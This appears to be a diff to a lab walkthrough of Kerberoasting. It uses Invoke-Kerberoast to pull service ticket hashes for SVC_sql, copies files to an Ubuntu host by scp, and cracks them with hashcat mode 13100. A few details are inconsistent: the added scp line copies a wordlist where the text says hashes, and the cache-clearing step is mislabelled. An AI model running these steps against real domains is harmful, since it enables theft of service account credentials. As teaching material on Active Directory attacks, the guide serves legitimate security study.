@@ -132,9 +132,15 @@ In the SAME **powershell** prompt:
 invoke-kerberoast -Identity SVC_sql
 ```
 
-> Invoke-Kerberoast's default output is for **John** (the password cracker installed by default on Kali), you can ofcourse change the output format to **HashCat** as well if you prefer working with that.
+> Invoke-Kerberoast's default output is for **John** (the password cracker installed by default on Kali), you need to change the output format to **HashCat** in order to crack the hashes with hashcat.
 
 On your `Windows 10 machine` use WinSCP to transfer ***hashes.kerberoast*** to your Ubuntu machine under the path ***"/opt/kerberos/"*** :
+
+Or you can use SCP to copy the file over:
+
+```yaml 
+scp Top1000.txt root@192.168.18.204:/opt/kerberos/Top1000.txt
+```
 
 > **IMPORTANT**: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.
 >
@@ -159,13 +165,24 @@ On your `Ubuntu Machine` we're going to use hashcat to crack the hashes
 First let's install hashcat
 
 ```yaml
-apt get update
+sudo apt update
 apt install hashcat
 ```
 
 ```yaml
 cd /opt/kerberos
-hashcat -m 13100 --force -a 0 hashes.kerberoast passwords.txt
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords.txt --potfile-disable -o cracked.txt
+```
+
+To clear the cache:
+
+```yaml
+hashcat --remove hashes.kerberoast
+```
+
+To clear the potfile
+```yaml
+sudo rm ~/.hashcat/hashcat.potfile
 ```
 
 
